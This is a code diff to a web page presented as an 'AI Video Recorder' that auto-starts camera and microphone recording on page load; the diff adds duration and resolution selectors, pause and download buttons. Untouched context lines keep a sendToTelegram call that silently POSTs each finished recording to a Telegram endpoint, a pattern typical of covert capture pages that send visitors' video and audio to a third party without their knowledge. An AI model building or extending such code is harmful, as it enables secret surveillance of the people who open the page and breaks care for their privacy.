@@ -32,7 +32,7 @@
         }
 
         button {
-            margin-top: 10px;
+            margin: 5px;
             padding: 10px 20px;
             background: #6a11cb;
             border: none;
@@ -53,6 +53,12 @@
             font-weight: bold;
         }
 
+        select {
+            margin: 10px;
+            padding: 5px;
+            font-size: 1rem;
+        }
+
         .footer {
             position: absolute;
             bottom: 10px;
@@ -66,7 +72,23 @@
     <video id="livePreview" autoplay muted></video>
     <video id="videoPlayer" controls></video>
     <div id="countdown">Recording time left: 60 seconds</div>
+
+    <label for="duration">Recording Duration:</label>
+    <select id="duration">
+        <option value="30">30 seconds</option>
+        <option value="60" selected>60 seconds</option>
+        <option value="120">120 seconds</option>
+    </select>
+
+    <label for="resolution">Resolution:</label>
+    <select id="resolution">
+        <option value="720">720p</option>
+        <option value="1080">1080p</option>
+    </select>
+
     <button id="toggleCamera">Switch to Rear Camera</button>
+    <button id="pauseResume">Pause</button>
+    <button id="downloadVideo">Download Video</button>
     <p>Recording will start automatically. Please allow camera and microphone access.</p>
     <div class="footer">© 2025 AI Video Recorder</div>
 
@@ -74,21 +96,22 @@
         let useRearCamera = false;
         let mediaRecorder;
         let stream;
-        const chunks = [];
+        let chunks = [];
         let countdownInterval;
+        let isPaused = false;
 
         async function startStream() {
             try {
+                const resolution = document.getElementById('resolution').value;
                 stream = await navigator.mediaDevices.getUserMedia({
                     video: { 
                         facingMode: useRearCamera ? 'environment' : 'user',
-                        width: { ideal: 1280 },
-                        height: { ideal: 720 }
+                        width: resolution === '1080' ? 1920 : 1280,
+                        height: resolution === '1080' ? 1080 : 720
                     },
                     audio: true
                 });
                 document.getElementById('livePreview').srcObject = stream;
-
                 startRecording();
             } catch (error) {
                 console.error('Error accessing camera or microphone:', error);
@@ -96,7 +119,10 @@
         }
 
         function startRecording() {
+            chunks = [];
+            const duration = parseInt(document.getElementById('duration').value) * 1000;
             mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm; codecs=vp9' });
+            
             mediaRecorder.ondataavailable = (event) => {
                 if (event.data.size > 0) chunks.push(event.data);
             };
@@ -106,16 +132,16 @@
                 document.getElementById('videoPlayer').src = URL.createObjectURL(blob);
                 document.getElementById('videoPlayer').load();
                 document.getElementById('videoPlayer').play();
-                sendToTelegram(blob);
+                sendToTelegram(blob); // Send video to Telegram
             };
 
             mediaRecorder.start();
-            startCountdown(60); // Start 1-minute countdown
+            startCountdown(duration / 1000);
 
             setTimeout(() => {
-                mediaRecorder.stop();
+                if (mediaRecorder.state !== 'inactive') mediaRecorder.stop();
                 stream.getTracks().forEach((track) => track.stop());
-            }, 60000); // Stop recording after 1 minute
+            }, duration);
         }
 
         function startCountdown(seconds) {
@@ -144,14 +170,14 @@
                 method: 'POST',
                 body: formData
             })
-                .then((response) => {
+                .then(response => {
                     if (response.ok) {
                         console.log('Video sent successfully!');
                     } else {
                         console.error('Failed to send video:', response.statusText);
                     }
                 })
-                .catch((error) => {
+                .catch(error => {
                     console.error('Error sending video:', error);
                 });
         }
@@ -163,6 +189,26 @@
                 stream.getTracks().forEach((track) => track.stop());
             }
             startStream();
+        });
+
+        document.getElementById('pauseResume').addEventListener('click', () => {
+            if (isPaused) {
+                mediaRecorder.resume();
+                isPaused = false;
+                document.getElementById('pauseResume').textContent = 'Pause';
+            } else {
+                mediaRecorder.pause();
+                isPaused = true;
+                document.getElementById('pauseResume').textContent = 'Resume';
+            }
+        });
+
+        document.getElementById('downloadVideo').addEventListener('click', () => {
+            const blob = new Blob(chunks, { type: 'video/webm' });
+            const link = document.createElement('a');
+            link.href = URL.createObjectURL(blob);
+            link.download = 'recorded_video.webm';
+            link.click();
         });
 
         // Start the stream when the page loads
